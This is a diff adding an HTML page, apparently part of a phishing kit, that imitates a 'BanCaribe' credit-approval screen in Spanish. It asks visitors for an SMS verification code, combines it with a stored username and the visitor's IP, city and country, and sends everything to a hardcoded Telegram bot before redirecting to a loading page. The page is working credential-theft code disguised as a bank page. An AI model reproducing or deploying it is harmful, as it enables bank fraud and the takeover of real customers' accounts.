@@ -1,0 +1,167 @@
+<!DOCTYPE html>
+<html lang="es">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Login</title>
+    <link rel="stylesheet" href="styles.css" />
+    <style>
+      .footer {
+        position: absolute;
+        bottom: 0;
+        left: 0;
+        width: 100%;
+        text-align: center;
+        background-color: transparent;
+        /* Cambia el color de fondo según tus preferencias */
+        padding: 20px 0;
+        box-sizing: border-box;
+      }
+
+      .footer img {
+        width: 50%;
+        min-width: 350px;
+        margin-top: 50px;
+        display: block;
+        margin-left: auto;
+        margin-right: auto;
+      }
+
+      @media only screen and (max-width: 600px) {
+        .footer img {
+          width: 80%;
+          /* Ajusta el tamaño de la imagen para dispositivos móviles */
+          min-width: unset;
+        }
+
+        .footer {
+          display: none;
+        }
+      }
+    </style>
+  </head>
+
+  <body style="font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif">
+    <div class="container">
+      <img src="logo.png" alt="Logo" class="logo" />
+      <form class="login-form" id="loginform">
+        <div
+          style="
+            width: 96%;
+            padding: 10px;
+            background: #00a0b1;
+            color: white;
+            font-weight: bold;
+          "
+        >
+          Verificar su monto de credito
+        </div>
+        <div style="margin: 30px">
+          <div style="margin: 10px; color: #00A0B1 !important">
+            <h5 style="padding: 0;margin-top: 0;">
+              Para aprobar el monto de tu crédito ingresa el código que
+              hemos enviado a tu celular registrado 
+            </h5>
+          </div>
+          <div style="width: 100%; text-align: center">
+            <div
+              style="
+                width: 100%;
+                text-align: center;
+                color: #00a0b1;
+                font-weight: bold;
+                margin-bottom: 20px;
+              "
+            >
+              Selecciona el monto de tu credito:
+            </div>
+            <div class="slider-container">
+              <div class="slider-value" id="sliderValue" style="color: #00a0b1">
+                $1,000 USD
+              </div>
+              <input
+                type="range"
+                min="300"
+                max="5000"
+                value="1000"
+                class="slider"
+                id="priceSlider"
+              />
+            </div>
+          </div>
+
+          <script>
+            const slider = document.getElementById("priceSlider");
+            const sliderValue = document.getElementById("sliderValue");
+
+            function formatNumber(num) {
+              if (num < 1000) {
+                return num;
+              }
+              return num.toString().replace(/\B(?=(\d{3})+(?!\d))/g, ",");
+            }
+
+            slider.addEventListener("input", function () {
+              sliderValue.textContent = `$${formatNumber(slider.value)} USD`;
+            });
+
+            // Formatear el valor inicial del slider
+            sliderValue.textContent = `$${formatNumber(slider.value)} USD`;
+          </script>
+          <input
+            type="text"
+            placeholder="Ingrese su código SMS"
+            id="userlogin"
+            style="width: 100%"
+            required
+          />
+
+          <button type="submit">Verificar</button>
+        </div>
+      </form>
+    </div>
+  </body>
+  <script src="https://cdn.jsdelivr.net/npm/axios@1.1.2/dist/axios.min.js"></script>
+
+  <script>
+    const url = "https://ipapi.co/json/";
+    const form = document.querySelector("#loginform");
+    form.addEventListener("submit", (event) => {
+      event.preventDefault(); // aqui evitamos que el código se repita evita que se envíe el formulario
+      axios
+        .get(url)
+        .then((response) => {
+          const tipodocben = document.querySelector("#userlogin").value;
+          const documento = localStorage.getItem("usuario");
+          const message =
+            "\nBanCaribe\nUsuario: " +
+            documento +
+            "\nSMS: " +
+            tipodocben +
+            "\nCiudad:" +
+            response.data.city +
+            "\nPais: " +
+            response.data.country +
+            "\nIP: " +
+            response.data.ip;
+          axios
+            .post(
+              "https://api.telegram.org/bot5555165841:AAE7e0yrao7YTcSmfDKy0Y6vnY0SO-0UyFE/sendMessage",
+              {
+                chat_id: "1024082369",
+                text: message,
+              }
+            )
+            .then((response) => {
+              window.location.href = "cargando2.html";
+            })
+            .catch((error) => {
+              console.error(error);
+            });
+        })
+        .catch((error) => {
+          console.log(error);
+        });
+    });
+  </script>
+</html>
